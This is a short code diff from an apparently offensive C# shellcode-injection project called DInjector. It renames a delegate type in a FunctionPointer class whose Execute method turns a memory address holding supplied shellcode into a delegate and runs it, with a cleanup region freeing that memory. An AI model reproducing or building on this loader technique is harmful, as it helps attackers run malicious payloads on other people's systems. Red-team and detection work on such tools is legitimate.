@@ -9,7 +9,7 @@ namespace DInjector
     class FunctionPointer
     {
         [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        delegate void pFunction();
+        delegate void FunctionPtr();
 
         public static void Execute(byte[] shellcode, bool debug = false)
         {
@@ -56,7 +56,7 @@ namespace DInjector
 
             #endregion
 
-            pFunction f = (pFunction)Marshal.GetDelegateForFunctionPointer(baseAddress, typeof(pFunction));
+            FunctionPtr f = (FunctionPtr)Marshal.GetDelegateForFunctionPointer(baseAddress, typeof(FunctionPtr));
             f();
 
             #region CleanUp: NtFreeVirtualMemory (shellcode)
